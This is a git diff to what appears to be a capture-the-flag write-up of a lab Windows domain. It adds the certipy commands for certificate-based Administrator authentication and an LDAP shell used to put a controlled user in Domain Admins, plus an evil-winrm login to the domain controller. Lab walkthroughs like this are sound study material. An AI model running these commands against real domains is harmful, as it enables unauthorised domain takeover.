@@ -313,11 +313,13 @@ Certificate Templates
 
 16. The normal way would be to get a TGT as the Adminsitrator. However, we get an error stating that the KDC does not support PKINIT authentiation.
 
+`certipy -debug auth -pfx administrator.pfx -dc-ip 10.129.229.56`
+
 <img width="1217" height="414" alt="image" src="https://github.com/user-attachments/assets/14941daa-5bbd-4754-a433-262c52002594" />
 
 17. In this case, we have a work around: getting an LDAP shell and then adding a user we control into the Domain Admins group to get root access
 
-``
+`certipy -debug auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell`
 
 <img width="1128" height="430" alt="image" src="https://github.com/user-attachments/assets/4d0c25f1-9126-43c2-8b34-3d8cd6526213" />
 
@@ -325,6 +327,6 @@ Certificate Templates
 
 18. We evil-winrm into the DC as svc_ldap and we get the root flag!
 
-``
+`evil-winrm -i dc.authority.htb -u svc_ldap -p $(cat ../user/svc_ldap.pass)`
 
 <img width="1049" height="408" alt="image" src="https://github.com/user-attachments/assets/6261e4b4-0170-4a88-bd09-174ab98a799b" />
